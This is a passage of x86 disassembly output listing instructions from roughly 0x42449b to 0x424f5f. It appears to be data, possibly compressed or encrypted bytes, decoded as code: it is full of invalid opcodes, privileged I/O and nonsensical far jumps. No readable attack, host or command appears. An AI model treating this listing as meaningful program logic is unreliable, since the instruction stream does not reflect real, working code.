  42449b:	imul   ebp,DWORD PTR [ebx],0xffffff96
  42449e:	test   al,0xa3
  4244a0:	call   0x7c58b8ce
  4244a5:	push   cs
  4244a6:	xchg   esp,eax
  4244a7:	call   0x62eaa5b0
  4244ac:	into   
  4244ad:	ins    DWORD PTR es:[edi],dx
  4244ae:	lea    esi,[ecx]
  4244b0:	mov    dh,0x9b
  4244b2:	cmp    ebp,DWORD PTR [edx]
  4244b4:	mov    DWORD PTR [edi+0x27],edi
  4244b7:	je     0x424443
  4244b9:	cmp    eax,0x2d5cbcbc
  4244be:	je     0x42445e
  4244c0:	pop    esi
  4244c1:	cdq    
  4244c2:	fidiv  DWORD PTR [ecx]
  4244c4:	sub    BYTE PTR ds:0x6c307544,0x3d
  4244cb:	and    BYTE PTR [edx+0x1467e574],cl
  4244d1:	and    eax,0x163802be
  4244d6:	jo     0x4244a3
  4244d8:	addr16 dec edx
  4244da:	daa    
  4244db:	out    0x38,eax
  4244dd:	leave  
  4244de:	xchg   esp,eax
  4244df:	pop    edx
  4244e0:	and    edx,ecx
  4244e2:	xchg   ebp,eax
  4244e3:	sub    ch,cl
  4244e5:	(bad)  
  4244e6:	or     edi,DWORD PTR [edx+eax*8]
  4244e9:	cmc    
  4244ea:	scas   eax,DWORD PTR es:[edi]
  4244eb:	cdq    
  4244ec:	retf   
  4244ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244ee:	retf   
  4244ef:	lea    ecx,[esi-0x73e7e4a]
  4244f5:	sbb    eax,0x63f28f21
  4244fa:	cmp    DWORD PTR [edx-0x2],ecx
  4244fd:	xor    al,0x25
  4244ff:	push   eax
  424500:	sahf   
  424501:	aam    0x19
  424503:	ret    
  424504:	inc    edi
  424505:	adc    edx,DWORD PTR [ebx]
  424507:	sar    DWORD PTR [eax],0xe5
  42450a:	jg     0x4244eb
  42450c:	jmp    0x42454b
  42450e:	imul   ebx,DWORD PTR [eax+0x73],0xffffffc5
  424512:	adc    esp,esp
  424514:	xchg   edx,eax
  424515:	in     al,dx
  424516:	inc    edx
  424517:	fwait
  424518:	xor    DWORD PTR [ebp+0x7ade45be],0x9ae79db4
  424522:	loop   0x42452f
  424524:	jp     0x424560
  424526:	dec    eax
  424527:	es leave 
  424529:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42452a:	pusha  
  42452b:	add    dh,bh
  42452d:	ss push ds
  42452f:	hlt    
  424530:	retf   0xb8b5
  424533:	sar    BYTE PTR [ebx-0x6],cl
  424536:	jp     0x424500
  424538:	jnp    0x4244d9
  42453a:	jmp    0x424557
  42453c:	adc    al,0x60
  42453e:	dec    esp
  42453f:	xchg   ecx,eax
  424540:	mov    dl,0x0
	...
  4245b2:	add    BYTE PTR [eax],al
  4245b4:	or     BYTE PTR [edi-0x8808b84],0x88
  4245bb:	(bad)  
  4245bc:	jle    0x424610
  4245be:	ins    BYTE PTR es:[edi],dx
  4245bf:	xor    DWORD PTR [edx+0x5d],ebx
  4245c2:	test   eax,0x18375b5
  4245c7:	add    ch,dh
  4245c9:	add    BYTE PTR [eax],al
  4245cb:	add    ch,al
  4245cd:	cli    
  4245ce:	xor    BYTE PTR [edi],0x14
  4245d1:	outs   dx,BYTE PTR ds:[esi]
  4245d2:	loop   0x4245b0
  4245d4:	sbb    ah,bl
  4245d6:	mov    ch,0xa9
  4245d8:	aaa    
  4245d9:	rcr    BYTE PTR [esi],1
  4245db:	sub    al,0x72
  4245dd:	inc    eax
  4245de:	xchg   esp,eax
  4245df:	sti    
  4245e0:	dec    esp
  4245e1:	(bad)  
  4245e2:	push   ecx
  4245e3:	mov    ds:0x15db69ad,eax
  4245e8:	int    0x62
  4245ea:	aam    0x1b
  4245ec:	push   es
  4245ed:	jne    0x424660
  4245ef:	fwait
  4245f0:	arpl   WORD PTR [edi-0x39],si
  4245f3:	std    
  4245f4:	push   ebp
  4245f5:	aas    
  4245f6:	jl     0x424626
  4245f8:	add    esp,DWORD PTR [ebp-0x10]
  4245fb:	jmp    0x4245a3
  4245fd:	jne    0x4245dd
  4245ff:	adc    al,0xd6
  424601:	ins    DWORD PTR es:[edi],dx
  424602:	das    
  424603:	in     eax,dx
  424604:	sbb    BYTE PTR [ecx-0x68],bl
  424607:	(bad)  
  424608:	stos   DWORD PTR es:[edi],eax
  424609:	lea    esp,[eax]
  42460b:	jg     0x42460d
  42460d:	inc    ebx
  42460e:	sahf   
  42460f:	lods   eax,DWORD PTR ds:[esi]
  424610:	sbb    al,0x36
  424612:	mov    edx,0x70b9ec7e
  424617:	stos   BYTE PTR es:[edi],al
  424618:	rcr    DWORD PTR [ecx],1
  42461a:	jmp    0xcae1:0xb4b13130
  424621:	push   edi
  424622:	popa   
  424623:	and    al,0x8b
  424625:	add    BYTE PTR [edi-0x68],dl
  424628:	inc    ebp
  424629:	mov    ecx,0x8e0edc51
  42462e:	push   eax
  42462f:	icebp  
  424630:	(bad)  
  424631:	jecxz  0x4245cf
  424633:	push   0xff3576f0
  424638:	(bad)  
  424639:	adc    eax,ebp
  42463b:	jg     0x4246ac
  42463d:	jp     0x42469c
  42463f:	pop    ss
  424640:	popf   
  424641:	cmp    eax,0xcdf3b925
  424646:	xor    BYTE PTR [ecx+0x4f],dh
  424649:	mov    al,ds:0x9d265e07
  42464e:	mov    edi,0x22771736
  424653:	das    
  424654:	push   edx
  424655:	jne    0x42460b
  424657:	ret    0xf5d9
  42465a:	pop    edi
  42465b:	lea    esi,[edx]
  42465d:	jmp    0x424651
  42465f:	adc    al,BYTE PTR [ebx]
  424661:	clc    
  424662:	lods   eax,DWORD PTR ds:[esi]
  424663:	retf   0xa0ad
  424666:	cmp    al,0xde
  424668:	mov    bl,0xdf
  42466a:	mov    eax,ds:0x2c3387e0
  42466f:	sub    al,BYTE PTR [esi+0x1d4c3e73]
  424675:	dec    ecx
  424676:	mov    edx,0x486a117a
  42467b:	(bad)  
  42467d:	adc    edi,DWORD PTR [edi]
  42467f:	add    ebx,0x3e
  424682:	sar    BYTE PTR [edx],cl
  424684:	push   ebp
  424685:	cdq    
  424686:	(bad)  
  424687:	sbb    al,0x90
  424689:	sbb    ah,BYTE PTR [ecx+0x1cc2f72b]
  42468f:	or     esp,DWORD PTR [eax]
  424691:	push   eax
  424692:	ins    BYTE PTR es:[edi],dx
  424693:	js     0x4246b0
  424695:	pop    es
  424696:	mov    eax,ds:0x93e172f3
  42469b:	mov    al,0x7c
  42469d:	mov    eax,ds:0x24570ee1
  4246a2:	shl    DWORD PTR [esi+0x23],0x1a
  4246a6:	adc    al,0x54
  4246a8:	push   edi
  4246a9:	inc    ebx
  4246aa:	pop    edi
  4246ab:	adc    al,0x8c
  4246ad:	call   0x1210:0xe7f53a3f
  4246b4:	inc    edx
  4246b5:	and    eax,0x13cf6ebc
  4246ba:	jmp    0xcebf3748
  4246bf:	xor    al,0xe
	...
  424731:	add    BYTE PTR [eax],al
  424733:	add    BYTE PTR [ebx+eiz*1],dh
  424736:	jo     0x4246d5
  424738:	ja     0x424719
  42473a:	std    
  42473b:	stos   DWORD PTR es:[edi],eax
  42473c:	lods   eax,DWORD PTR ds:[esi]
  42473d:	and    ebp,esi
  42473f:	ffree  st(1)
  424741:	das    
  424742:	xor    ah,cl
  424744:	push   0xffffff84
  424746:	add    DWORD PTR [eax],eax
  424748:	cmc    
  424749:	add    BYTE PTR [eax],al
  42474b:	add    BYTE PTR [edi-0x6c],cl
  42474e:	arpl   WORD PTR [eax+0x62],sp
  424751:	mov    fs,esp
  424753:	jmp    0xe73a:0xb337136e
  42475a:	or     BYTE PTR [edi+0x40],bl
  42475d:	and    bh,ch
  42475f:	popa   
  424760:	jecxz  0x4247b3
  424762:	sub    BYTE PTR [ecx],dh
  424764:	jecxz  0x4247cf
  424766:	(bad)  
  424767:	xor    DWORD PTR [edx],edi
  424769:	and    DWORD PTR [edi-0x45],edi
  42476c:	add    al,0x34
  42476e:	rcr    BYTE PTR [ebp+0x6c17d482],cl
  424774:	mov    ah,0x2c
  424776:	xchg   edi,eax
  424777:	inc    ecx
  424778:	or     BYTE PTR [ebp-0x2eae25e0],dh
  42477e:	lock das 
  424780:	adc    eax,edi
  424782:	pop    edx
  424783:	mov    ah,0x11
  424785:	cmp    DWORD PTR [eax],0xffffffb3
  424788:	(bad)  
  424789:	push   edx
  42478a:	cmp    eax,0x8126cb05
  42478f:	pop    edi
  424790:	shr    DWORD PTR [edx-0x74],0xa6
  424794:	jg     0x424755
  424796:	mov    dh,0x43
  424798:	inc    ebx
  424799:	mov    dl,0x7b
  42479b:	ret    0x2dd5
  42479e:	inc    edi
  42479f:	or     DWORD PTR [ebp-0x20],edi
  4247a2:	sahf   
  4247a3:	test   al,0xd
  4247a5:	jg     0x424769
  4247a7:	sub    al,0xbf
  4247a9:	fcmovu st,st(0)
  4247ab:	cmc    
  4247ac:	les    edx,FWORD PTR [edi]
  4247ae:	pop    ebp
  4247af:	jne    0x42479b
  4247b1:	and    edx,DWORD PTR [eax-0x5121bd1e]
  4247b7:	xchg   ecx,eax
  4247b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4247b9:	out    0xf,al
  4247bb:	aas    
  4247bc:	inc    ebx
  4247bd:	push   es
  4247be:	mov    ebp,0xc7ceb984
  4247c3:	loopne 0x424756
  4247c5:	data16 (bad) 
  4247c8:	out    dx,eax
  4247c9:	clc    
  4247ca:	jmp    0x42479f
  4247cc:	mov    edi,0x92a29e45
  4247d1:	call   0xff5e:0x88015d7e
  4247d8:	jo     0x4247a5
  4247da:	sub    al,0x7d
  4247dc:	and    ebp,DWORD PTR [eax-0x6d]
  4247df:	sub    edx,DWORD PTR ds:0x1da4aada
  4247e5:	mov    BYTE PTR [ecx+ebx*2+0x79288d0a],dl
  4247ec:	xchg   esi,eax
  4247ed:	js     0x4247d0
  4247ef:	in     al,0xd3
  4247f1:	sub    edi,esp
  4247f3:	enter  0xf481,0x3
  4247f7:	inc    esi
  4247f8:	test   edi,esi
  4247fa:	or     cl,BYTE PTR [ebx-0x5eb7824f]
  424800:	jp     0x42481f
  424802:	std    
  424803:	(bad)  
  424805:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424806:	shl    BYTE PTR [ecx-0x1d9857e],cl
  42480c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42480d:	rcl    DWORD PTR [edx],cl
  42480f:	cmp    BYTE PTR [edx+ebp*4+0x48],cl
  424813:	mov    dh,0x57
  424815:	and    al,0x27
  424817:	sbb    BYTE PTR [ecx+0x98d3e8c],bh
  42481d:	lds    edx,FWORD PTR [esi]
  42481f:	mov    ch,0x35
  424821:	xchg   esi,eax
  424822:	mov    cl,0xb5
  424824:	jge    0x4247bf
  424826:	call   0x6ffa:0xa2ff3f0c
  42482d:	loope  0x4247ce
  42482f:	outs   dx,BYTE PTR ds:[esi]
  424830:	pop    ecx
  424831:	mov    ds:0x77c0e717,eax
  424836:	mov    ebp,0x948aec05
  42483b:	push   eax
  42483c:	xchg   BYTE PTR [esi],cl
  42483e:	iret   
  42483f:	sbb    dl,BYTE PTR [eax]
	...
  4248b1:	add    BYTE PTR [eax],al
  4248b3:	add    BYTE PTR [edx-0x770e5c],cl
  4248b9:	(bad)  
  4248bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248bc:	arpl   WORD PTR [ecx+0x31],dx
  4248bf:	je     0x424872
  4248c1:	test   dl,bh
  4248c3:	mov    BYTE PTR [edi-0x7b],bl
  4248c6:	add    DWORD PTR [eax],eax
  4248c8:	cmc    
  4248c9:	add    BYTE PTR [eax],al
  4248cb:	add    BYTE PTR [esi-0x559f87e2],cl
  4248d1:	leave  
  4248d2:	or     BYTE PTR [edi+0x35d7b614],dl
  4248d8:	push   cs
  4248d9:	div    DWORD PTR ds:0x21c6444f
  4248df:	pop    ds
  4248e0:	popf   
  4248e1:	fcmovne st,st(7)
  4248e3:	cdq    
  4248e4:	addr16 clc 
  4248e6:	enter  0x6af3,0xdb
  4248ea:	jecxz  0x42490b
  4248ec:	rcr    DWORD PTR [eax],cl
  4248ee:	test   DWORD PTR ds:[ecx],0x9d6d39aa
  4248f5:	jns    0x4248ad
  4248f7:	loop   0x4248c1
  4248f9:	add    BYTE PTR [edi],dl
  4248fb:	iret   
  4248fc:	lods   al,BYTE PTR ds:[esi]
  4248fd:	je     0x4248cf
  4248ff:	push   edi
  424900:	mov    al,0x72
  424902:	cmp    al,0xc3
  424904:	xor    al,0x2b
  424906:	aaa    
  424907:	mov    al,0xad
  424909:	cmp    ah,BYTE PTR [edi]
  42490b:	mov    esp,0xb3da30a1
  424910:	mov    BYTE PTR [esi-0x47731b64],dh
  424916:	ds push ebp
  424918:	push   edx
  424919:	sub    dl,BYTE PTR [edx-0x25]
  42491c:	enter  0x9e15,0x67
  424920:	add    dl,BYTE PTR [esi]
  424922:	sub    ebp,edi
  424924:	inc    esp
  424925:	and    al,0x90
  424927:	push   ds
  424928:	arpl   WORD PTR ss:[edx],bx
  42492b:	mov    ebp,eax
  42492d:	mov    cl,0xca
  42492f:	adc    al,0xf4
  424931:	xchg   ebx,edx
  424933:	cmp    al,0xcf
  424935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424936:	jmp    0x91a9:0xf7bf30fe
  42493d:	call   0xf460:0x11e24d0
  424944:	jae    0x4248f6
  424946:	(bad)  
  424947:	push   ds
  424948:	dec    esp
  424949:	pop    ss
  42494a:	mov    ebx,DWORD PTR [esi-0xd47484]
  424950:	js     0x4248ee
  424952:	xchg   ecx,eax
  424953:	and    bl,BYTE PTR [eax-0x68d6d667]
  424959:	push   ebx
  42495a:	add    ebp,DWORD PTR [ecx+0x6ff88822]
  424960:	(bad)  
  424962:	xchg   ebx,eax
  424963:	out    dx,al
  424964:	out    dx,al
  424965:	mov    gs,WORD PTR [ebx-0x7e]
  424968:	bound  eax,QWORD PTR [ebx]
  42496a:	loop   0x42495d
  42496c:	mov    al,ds:0xec29565
  424971:	jb     0x424916
  424973:	sbb    BYTE PTR [ebp-0x30],bl
  424976:	jecxz  0x4249b6
  424978:	ja     0x424907
  42497a:	dec    ebx
  42497b:	or     ebx,ebx
  42497d:	inc    edx
  42497e:	sub    eax,DWORD PTR ds:0x9d6de4cf
  424984:	dec    ebp
  424985:	dec    ecx
  424986:	enter  0x17f,0xdf
  42498a:	inc    ecx
  42498b:	xchg   BYTE PTR [ecx+0x8264532],dl
  424991:	dec    eax
  424992:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424993:	pop    ebx
  424994:	nop
  424995:	mov    dh,0xb8
  424997:	loope  0x424a0c
  424999:	mov    al,0xcf
  42499b:	ins    BYTE PTR es:[edi],dx
  42499c:	sub    DWORD PTR [ebp-0x2a82195c],ecx
  4249a2:	cmp    BYTE PTR [ebp+0x3442ccad],bl
  4249a8:	cmp    BYTE PTR [esi-0x37],dh
  4249ab:	scas   eax,DWORD PTR es:[edi]
  4249ac:	out    dx,eax
  4249ad:	(bad)  
  4249ae:	iret   
  4249af:	bound  esi,QWORD PTR [edx-0xd4d2121]
  4249b5:	out    0x6f,eax
  4249b7:	inc    esp
  4249b8:	retf   0xe2d6
  4249bb:	push   0xffffffb9
  4249bd:	dec    ecx
  4249be:	arpl   WORD PTR [eax+0xbf],bp
	...
  424a34:	xor    BYTE PTR ds:0xdf7d9f75,bh
  424a3a:	cli    
  424a3b:	mov    edi,0x13301881
  424a40:	sub    DWORD PTR [ebx-0x79abe0d0],ecx
  424a46:	add    DWORD PTR [eax],eax
  424a48:	cmc    
  424a49:	add    BYTE PTR [eax],al
  424a4b:	add    al,dl
  424a4d:	sbb    BYTE PTR [edi-0x15d5abe6],ah
  424a53:	mov    ebx,0x8cacbfd1
  424a58:	jno    0x424a5f
  424a5a:	push   esp
  424a5b:	sti    
  424a5c:	hlt    
  424a5d:	xor    ebx,DWORD PTR [ebp-0x73f6b32a]
  424a63:	sbb    eax,DWORD PTR [edx]
  424a65:	mov    dl,0xfd
  424a67:	seto   cl
  424a6a:	mov    al,ds:0x7565148e
  424a6f:	xor    al,0x4
  424a71:	xor    esp,0x30e92416
  424a77:	inc    ecx
  424a78:	or     cl,BYTE PTR [ecx+eax*1]
  424a7b:	pop    ebx
  424a7c:	stos   DWORD PTR es:[edi],eax
  424a7d:	jle    0x424a31
  424a7f:	add    al,0x49
  424a81:	ins    DWORD PTR es:[edi],dx
  424a82:	mov    bl,0x20
  424a84:	jmp    0x427de5f9
  424a89:	lahf   
  424a8a:	call   0x4df94ca8
  424a8f:	(bad)  
  424a90:	in     al,dx
  424a91:	out    0x5,al
  424a93:	xchg   edx,eax
  424a94:	mov    esp,0x634da4bf
  424a99:	add    BYTE PTR [esi-0x6b],dl
  424a9c:	sbb    ecx,esi
  424a9e:	test   BYTE PTR [edi+0x3],ah
  424aa1:	xor    al,0xb6
  424aa3:	add    DWORD PTR [ecx-0x28],ecx
  424aa6:	cld    
  424aa7:	xchg   ebp,eax
  424aa8:	test   ah,dh
  424aaa:	pop    eax
  424aab:	nop
  424aac:	add    ah,bl
  424aae:	adc    bh,cl
  424ab0:	ins    DWORD PTR es:[edi],dx
  424ab1:	gs sahf 
  424ab3:	adc    esi,DWORD PTR [edx]
  424ab5:	popa   
  424ab6:	imul   ecx,DWORD PTR ds:0x9918c72c,0xeb12082b
  424ac0:	push   es
  424ac1:	aad    0x6c
  424ac3:	xor    eax,0xe56f4f27
  424ac8:	push   esi
  424ac9:	aaa    
  424aca:	mov    dh,0xd0
  424acc:	(bad)
  424ad0:	test   DWORD PTR [eax-0x700e46cb],edx
  424ad6:	add    esi,ecx
  424ad8:	out    0x10,eax
  424ada:	xor    al,0xb8
  424adc:	adc    dl,dh
  424ade:	jg     0x424a6d
  424ae0:	test   eax,0x76ad48ce
  424ae5:	ffreep st(5)
  424ae7:	adc    esi,DWORD PTR [eax+0x4eb09a89]
  424aed:	add    BYTE PTR [ebx-0xa],bl
  424af0:	and    DWORD PTR [ecx+0x5a3b2975],ebp
  424af6:	and    al,0xb0
  424af8:	jp     0x424ac7
  424afa:	mov    esp,0xb16ba48c
  424aff:	into   
  424b00:	fsub   DWORD PTR ds:0xd9b753e5
  424b06:	xor    DWORD PTR [esi-0x13],edx
  424b09:	ds ret 0x9d1b
  424b0d:	inc    ecx
  424b0e:	and    al,0xae
  424b10:	iret   
  424b11:	inc    ecx
  424b12:	lahf   
  424b13:	push   ecx
  424b14:	les    edi,FWORD PTR ds:0x3b1be73d
  424b1a:	pop    ebp
  424b1b:	xor    cl,BYTE PTR [esi-0x21]
  424b1e:	cmp    ah,BYTE PTR [esi+0x4b]
  424b21:	clc    
  424b22:	fldcw  WORD PTR [ebx-0x28e9af07]
  424b28:	mov    ds:0x85cc0c9d,al
  424b2d:	aad    0x92
  424b2f:	xchg   DWORD PTR [edi+eax*1+0x4842a73f],ebp
  424b36:	ret    0x22c6
  424b39:	sbb    BYTE PTR [edx+0x2b],0xb1
  424b3d:	daa    
  424b3e:	mov    ebp,0x58f
	...
  424bb3:	add    ch,bh
  424bb5:	(bad)  
  424bb6:	test   eax,0xff57ab46
  424bbb:	jmp    FWORD PTR [edx-0x10b9f881]
  424bc1:	in     al,0xf7
  424bc3:	loopne 0x424c0e
  424bc5:	xchg   DWORD PTR [ecx],eax
  424bc7:	add    ch,dh
  424bc9:	add    BYTE PTR [eax],al
  424bcb:	add    BYTE PTR [ecx-0x285ed95],dh
  424bd1:	inc    eax
  424bd2:	and    DWORD PTR [ecx-0x234d37ce],esp
  424bd8:	pop    ebx
  424bd9:	arpl   WORD PTR [edx+ecx*2-0x74c96588],di
  424be0:	xor    al,0x8c
  424be2:	cld    
  424be3:	cli    
  424be4:	(bad)  
  424be5:	stos   BYTE PTR es:[edi],al
  424be6:	loop   0x424bbb
  424be8:	push   ds
  424be9:	nop
  424bea:	out    dx,al
  424beb:	cmp    eax,0x31ad30e1
  424bf0:	mov    BYTE PTR [esp+ecx*8],bh
  424bf3:	stc    
  424bf4:	(bad)  
  424bf6:	push   cs
  424bf7:	push   esi
  424bf8:	xor    DWORD PTR [edi-0x79],ebp
  424bfb:	(bad)  
  424bfd:	xchg   BYTE PTR [ebx],dh
  424bff:	jb     0x424c2e
  424c01:	pop    ecx
  424c02:	(bad)  
  424c03:	and    BYTE PTR [ebx],cl
  424c05:	adc    al,0x38
  424c07:	inc    esi
  424c08:	fstp   TBYTE PTR [eax*4+0x20c8aa03]
  424c0f:	outs   dx,DWORD PTR ds:[esi]
  424c10:	sbb    ebx,ebx
  424c12:	daa    
  424c13:	pop    edx
  424c14:	adc    eax,0x1d8a13c7
  424c19:	cli    
  424c1a:	xchg   edi,eax
  424c1b:	test   DWORD PTR [ecx],0x3e53a540
  424c21:	ja     0x424bea
  424c23:	push   ds
  424c24:	mov    edi,0x4860cf21
  424c29:	jl     0x424c58
  424c2b:	mov    edx,0x9c576b7c
  424c30:	jecxz  0x424cae
  424c32:	enter  0x12f2,0x96
  424c36:	mov    dl,0x16
  424c38:	jg     0x424c7f
  424c3a:	jle    0x424c24
  424c3c:	cld    
  424c3d:	popf   
  424c3e:	add    eax,0x3c4e99a5
  424c43:	jp     0x424cbe
  424c45:	push   ebx
  424c46:	jnp    0x424c1a
  424c48:	in     al,dx
  424c49:	push   edx
  424c4a:	in     eax,dx
  424c4b:	(bad)  
  424c4c:	push   esp
  424c4d:	xor    dh,BYTE PTR [ebp+0x49f5bd30]
  424c53:	call   0xd686:0x1ac89625
  424c5a:	push   cs
  424c5b:	xchg   edx,eax
  424c5c:	push   ds
  424c5d:	push   ecx
  424c5e:	or     DWORD PTR [ebp+0x6026736c],ecx
  424c64:	add    bh,BYTE PTR [edx]
  424c66:	jae    0x424cad
  424c68:	std    
  424c69:	or     BYTE PTR [edi-0x215778ac],bh
  424c6f:	popf   
  424c70:	scas   al,BYTE PTR es:[edi]
  424c71:	mov    ecx,0xe13f1b9f
  424c76:	add    BYTE PTR [edi+esi*1+0x1d],ch
  424c7a:	pop    ebp
  424c7b:	ja     0x424c7e
  424c7d:	mov    esp,0xa2265a07
  424c82:	loop   0x424c85
  424c84:	cmp    dh,BYTE PTR [edx+0x1a831ce3]
  424c8a:	xor    edi,DWORD PTR [ebx+0xc0e892a]
  424c90:	cli    
  424c91:	out    0x1a,eax
  424c93:	push   esp
  424c94:	mov    ecx,0x4c9ba7a1
  424c99:	das    
  424c9a:	mov    bl,BYTE PTR [ecx+0x8]
  424c9d:	aam    0xbb
  424c9f:	push   esp
  424ca0:	stos   BYTE PTR es:[edi],al
  424ca1:	jge    0x424d13
  424ca3:	shl    DWORD PTR [eax-0x169fa9fd],0xa5
  424caa:	(bad)  
  424cac:	mov    DWORD PTR ds:0x8387d507,ebx
  424cb2:	idiv   dh
  424cb4:	push   ebx
  424cb5:	jae    0x424ccd
  424cb7:	push   0x78
  424cb9:	or     al,0xe8
  424cbb:	mov    dl,0x7a
  424cbd:	mov    DWORD PTR [eax+0x3],edx
  424cc0:	mov    esi,0x0
	...
  424d31:	add    BYTE PTR [eax],al
  424d33:	add    BYTE PTR [edx-0xa],ah
  424d36:	xchg   DWORD PTR [ecx],ecx
  424d38:	xchg   edi,eax
  424d39:	jns    0x424d29
  424d3b:	inc    DWORD PTR [ecx+ecx*4-0x12e66b29]
  424d42:	lock jns 0x424d83
  424d45:	mov    BYTE PTR [ecx],al
  424d47:	add    ch,dh
  424d49:	add    BYTE PTR [eax],al
  424d4b:	add    BYTE PTR [ebx],cl
  424d4d:	ret    0xc8e3
  424d50:	mov    esp,0xbd415592
  424d55:	ucomiss xmm6,DWORD PTR [ebp+0x4b0493d3]
  424d5c:	dec    ecx
  424d5d:	(bad)  
  424d5f:	push   eax
  424d60:	jb     0x424d4c
  424d62:	popf   
  424d63:	outs   dx,BYTE PTR ds:[esi]
  424d64:	shl    ah,1
  424d66:	dec    DWORD PTR [ebx+0x3c164c8f]
  424d6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d6d:	mov    bh,0x46
  424d70:	xor    esp,DWORD PTR [eax-0x4179c0fa]
  424d76:	aaa    
  424d77:	or     WORD PTR es:[edx+0x44740376],di
  424d7f:	cmp    cl,ch
  424d81:	imul   edi,DWORD PTR [edi-0x2c9a86e3],0x4bc16520
  424d8b:	clc    
  424d8c:	imul   BYTE PTR [ebx+0x33]
  424d8f:	shl    DWORD PTR [ebx],0xbb
  424d92:	int    0x76
  424d94:	in     eax,0x5d
  424d96:	test   eax,0xd00eabdd
  424d9b:	push   es
  424d9c:	cmp    ebp,ebp
  424d9e:	(bad)
  424da1:	push   ss
  424da2:	es push ecx
  424da4:	dec    esi
  424da5:	push   ss
  424da6:	outs   dx,BYTE PTR ds:[esi]
  424da7:	lahf   
  424da8:	xor    eax,0xdd5a2c45
  424dad:	(bad)  
  424dae:	push   cs
  424daf:	sub    BYTE PTR [eax+0x25],bh
  424db2:	mov    edi,0xda73c92a
  424db7:	mov    cl,BYTE PTR [ebp-0x7]
  424dba:	push   0x74
  424dbc:	adc    eax,0x2183b686
  424dc1:	adc    ebx,DWORD PTR [eax+0x15]
  424dc4:	push   es
  424dc5:	(bad)  
  424dc6:	aad    0xc8
  424dc8:	push   esp
  424dc9:	push   ecx
  424dca:	or     ah,BYTE PTR [esi+ecx*1]
  424dcd:	cmc    
  424dce:	pandn  mm7,mm3
  424dd1:	js     0x424de7
  424dd3:	mov    esi,0x3df593c7
  424dd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424dd9:	outs   dx,BYTE PTR ds:[esi]
  424dda:	ins    BYTE PTR es:[edi],dx
  424ddb:	ds fwait
  424ddd:	pop    esi
  424dde:	push   0xffffffec
  424de0:	mov    al,0xbe
  424de2:	jb     0x424e24
  424de4:	loopne 0x424e12
  424de6:	pop    edi
  424de7:	push   edx
  424de8:	test   BYTE PTR [ecx-0x4bb57999],dl
  424dee:	or     eax,ecx
  424df0:	lock call DWORD PTR fs:[edi+0x17]
  424df5:	mov    ebp,0x55ebc6d0
  424dfa:	push   esi
  424dfb:	dec    eax
  424dfd:	ins    DWORD PTR es:[edi],dx
  424dfe:	jmp    0x43aa89e7
  424e03:	shr    BYTE PTR [edx],1
  424e05:	cdq    
  424e06:	sbb    al,0xb9
  424e08:	mov    ebx,0x5dd2998b
  424e0d:	xchg   BYTE PTR [esi],bh
  424e0f:	(bad)  
  424e10:	(bad)  
  424e11:	mov    al,ds:0xcca5e21d
  424e16:	pop    edx
  424e17:	jnp    0x424dfa
  424e19:	test   eax,0x7e1e3fe9
  424e1e:	fisubr WORD PTR [ebx-0x748478d1]
  424e24:	push   DWORD PTR [esi]
  424e26:	sub    esp,DWORD PTR [eax-0x25b928f4]
  424e2c:	mov    al,0x51
  424e2e:	es cmp al,0x85
  424e31:	jecxz  0x424dff
  424e33:	lods   eax,DWORD PTR ds:[esi]
  424e34:	not    DWORD PTR [esi+0x56ffa3f]
  424e3a:	push   eax
  424e3b:	repz push 0x33
  424e3e:	sbb    dl,BYTE PTR [esi+0x9]
	...
  424eb1:	add    BYTE PTR [eax],al
  424eb3:	add    BYTE PTR [esi+0x74b9649a],ch
  424eb9:	(bad)  
  424eba:	call   FWORD PTR [edi-0x6d72b26e]
  424ec0:	mov    al,0xe7
  424ec2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424ec3:	cdq    
  424ec4:	xor    ecx,DWORD PTR [ecx+0xf50001]
  424eca:	add    BYTE PTR [eax],al
  424ecc:	enter  0xcda7,0x5b
  424ed0:	pop    eax
  424ed1:	adc    esi,ebx
  424ed3:	and    esp,DWORD PTR [ecx]
  424ed5:	les    edi,FWORD PTR [esi+0x1453156]
  424edb:	ins    DWORD PTR es:[edi],dx
  424edc:	loopne 0x424f45
  424ede:	push   edx
  424edf:	push   ss
  424ee0:	xor    BYTE PTR [ecx+0x70],bl
  424ee3:	outs   dx,BYTE PTR ds:[esi]
  424ee4:	(bad)  
  424ee5:	paddw  mm0,mm1
  424ee8:	je     0x424ec0
  424eea:	add    ebx,ecx
  424eec:	in     eax,0x16
  424eee:	pop    ss
  424eef:	into   
  424ef0:	jge    0x424e9b
  424ef2:	mov    WORD PTR [eax+0x34],ss
  424ef5:	outs   dx,BYTE PTR ds:[esi]
  424ef6:	rcl    ebp,0x43
  424ef9:	and    DWORD PTR [edx],edx
  424efb:	pop    ecx
  424efc:	imul   ebx,DWORD PTR [edi-0x36aa4b64],0x59
  424f03:	and    eax,0x3f20c88b
  424f08:	jno    0x424f3d
  424f0a:	pop    esp
  424f0b:	pop    ecx
  424f0c:	or     eax,0xf0a589eb
  424f11:	adc    dh,BYTE PTR [ebp+0x74f3e99f]
  424f17:	xor    eax,DWORD PTR [esi+0x4a]
  424f1a:	push   ecx
  424f1b:	fs jmp 0x535f872f
  424f21:	inc    edx
  424f22:	fdiv   QWORD PTR [ecx]
  424f24:	xor    bl,dl
  424f26:	jle    0x424f17
  424f28:	adc    ecx,DWORD PTR [edi+0x5073a956]
  424f2e:	sub    eax,0xa5da4996
  424f33:	mov    ebx,0x113cc1df
  424f38:	push   ecx
  424f39:	jp     0x424efa
  424f3b:	inc    edi
  424f3c:	jo     0x424ef8
  424f3e:	add    al,0xd6
  424f40:	or     BYTE PTR fs:[esi+edx*8+0x1e],dl
  424f45:	push   ecx
  424f46:	jb     0x424f72
  424f48:	push   ebp
  424f49:	mov    al,0xfc
  424f4b:	adc    eax,0xf2e39540
  424f50:	repz enter 0x6cad,0x5b
  424f55:	and    DWORD PTR [ebx+ebx*1],edi
  424f58:	daa    
  424f59:	out    dx,al
  424f5a:	mov    al,0x16
  424f5c:	jne    0x424f8e
  424f5e:	dec    esp
  424f5f:	lahf   
